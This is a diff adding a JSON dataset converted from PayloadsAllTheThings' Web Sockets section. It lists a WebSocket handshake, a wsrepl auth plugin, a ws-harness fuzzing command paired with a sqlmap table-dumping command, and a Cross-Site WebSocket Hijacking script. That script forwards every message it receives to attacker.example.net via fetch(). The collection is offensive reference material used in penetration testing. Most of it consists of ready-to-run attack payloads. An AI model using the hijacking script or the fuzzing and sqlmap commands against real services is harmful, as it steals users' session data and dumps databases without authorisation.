@@ -1,0 +1,90 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "web_sockets",
+  "original_category": "Web Sockets",
+  "payloads": [
+    {
+      "category": "Web Socket Protocol",
+      "escalation": "baseline",
+      "lines": [
+        "GET /chat HTTP/1.1",
+        "Host: example.com:80",
+        "Upgrade: websocket",
+        "Connection: Upgrade",
+        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==",
+        "Sec-WebSocket-Version: 13",
+        "HTTP/1.1 101 Switching Protocols",
+        "Upgrade: websocket",
+        "Connection: Upgrade",
+        "Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo="
+      ]
+    },
+    {
+      "category": "Using wsrepl",
+      "escalation": "baseline",
+      "lines": [
+        "pip install wsrepl",
+        "wsrepl -u URL -P auth_plugin.py",
+        "from wsrepl import Plugin",
+        "from wsrepl.WSMessage import WSMessage",
+        "import json",
+        "import requests",
+        "class Demo(Plugin):",
+        "def init(self):",
+        "token = requests.get(\"https://example.com/uuid\").json()[\"uuid\"]",
+        "self.messages = [",
+        "json.dumps({",
+        "\"auth\": \"session\",",
+        "\"sessionId\": token",
+        "})",
+        "]",
+        "async def on_message_sent(self, message: WSMessage) -> None:",
+        "original = message.msg",
+        "message.msg = json.dumps({",
+        "\"type\": \"message\",",
+        "\"data\": {",
+        "\"text\": original",
+        "}",
+        "})",
+        "message.short = original",
+        "message.long = message.msg",
+        "async def on_message_received(self, message: WSMessage) -> None:",
+        "original = message.msg",
+        "try:",
+        "message.short = json.loads(original)[\"data\"][\"text\"]",
+        "except:",
+        "message.short = \"Error: could not parse message\"",
+        "message.long = original"
+      ]
+    },
+    {
+      "category": "Using ws-harness.py",
+      "escalation": "baseline",
+      "lines": [
+        "python ws-harness.py -u \"ws://dvws.local:8080/authenticate-user\" -m ./message.txt",
+        "{",
+        "\"auth_user\":\"dGVzda==\",",
+        "\"auth_pass\":\"[FUZZ]\"",
+        "}",
+        "sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump"
+      ]
+    },
+    {
+      "category": "Cross-Site WebSocket Hijacking (CSWSH)",
+      "escalation": "baseline",
+      "lines": [
+        "<script>",
+        "ws = new WebSocket('wss://vulnerable.example.com/messages');",
+        "ws.onopen = function start(event) {",
+        "ws.send(\"HELLO\");",
+        "}",
+        "ws.onmessage = function handleReply(event) {",
+        "fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});",
+        "}",
+        "ws.send(\"Some text sent to the server\");",
+        "</script>"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.865Z"
+}
